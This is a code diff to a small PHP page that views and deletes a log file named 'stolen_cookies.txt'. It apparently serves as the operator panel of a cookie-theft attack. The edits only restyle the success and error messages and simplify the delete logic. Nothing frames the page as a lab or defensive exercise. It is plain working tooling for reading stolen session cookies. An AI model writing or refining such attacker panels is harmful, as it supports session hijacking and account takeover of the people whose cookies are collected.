@@ -6,10 +6,12 @@
         body { font-family: Arial, sans-serif; margin: 2em; }
         .container { max-width: 800px; margin: auto; }
         pre { background: #f4f4f4; padding: 1em; border: 1px solid #ddd; white-space: pre-wrap; }
-        .log-entry { margin-bottom: 1em; padding: 1em; border-bottom: 1px solid #ccc; }
         .delete-form { margin-top: 1em; }
         .btn { padding: 10px 15px; background-color: #dc3545; color: white; border: none; cursor: pointer; }
         .btn:hover { background-color: #c82333; }
+        .message { padding: 10px; border-radius: 5px; margin-bottom: 1em; }
+        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
     </style>
 </head>
 <body>
@@ -18,16 +20,14 @@
         
         <?php
             $logFile = 'stolen_cookies.txt';
-            $deleteAction = false;
 
             // Handle delete request
             if (isset($_POST['delete'])) {
                 if (file_exists($logFile)) {
-                    unlink($logFile); // Delete the file
-                    $deleteAction = true;
-                    echo '<p style="color: green;">Log file has been deleted.</p>';
+                    unlink($logFile);
+                    echo '<div class="message success">Log file has been deleted.</div>';
                 } else {
-                    echo '<p style="color: red;">Log file does not exist.</p>';
+                    echo '<div class="message error">Log file does not exist.</div>';
                 }
             }
         ?>
@@ -37,7 +37,7 @@
             if (file_exists($logFile) && filesize($logFile) > 0) {
                 $fileContent = file_get_contents($logFile);
                 echo '<pre>' . htmlspecialchars($fileContent) . '</pre>';
-            } elseif (!$deleteAction) {
+            } else {
                 echo '<p>No cookies have been logged yet.</p>';
             }
         ?>
